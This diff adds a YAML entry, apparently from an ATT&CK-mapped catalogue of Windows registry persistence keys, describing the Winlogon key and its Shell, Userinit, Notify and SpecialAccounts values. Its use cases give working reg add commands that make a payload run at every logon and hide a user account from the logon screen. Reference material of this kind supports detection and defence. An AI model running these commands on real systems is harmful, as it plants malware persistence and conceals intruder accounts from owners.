@@ -1,0 +1,31 @@
+name: "Winlogon"
+description: "Registry keys controlling Windows logon process. The Notify subkey can load DLLs during logon events, providing a persistence mechanism. Also contains Shell and Userinit values."
+tags:
+  - persistence
+  - privilege_escalation
+mitre_ids:
+  - T1547.004
+keys:
+  - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+  - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify'
+  - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+resources:
+  - link: https://learn.microsoft.com/en-us/windows/win32/secauthn/winlogon-and-gina
+  - link: https://attack.mitre.org/techniques/T1547/004/
+use_cases:
+  - title: "Modify Shell value for persistence"
+    description: "Replaces or appends to the Shell value to execute malware at logon."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Temp\payload.exe" /f
+  - title: "Abuse Userinit for persistence"
+    description: "Appends malware to Userinit value which runs at every user logon."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\payload.exe" /f
+  - title: "Register Notify DLL (legacy)"
+    description: "Registers a DLL to receive Winlogon notifications (pre-Vista)."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MyNotify" /v "DllName" /t REG_SZ /d "C:\Windows\System32\notify.dll" /f
+  - title: "Hide user from logon screen"
+    description: "Hides a user account from the Windows logon screen."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "HiddenUser" /t REG_DWORD /d 0 /f
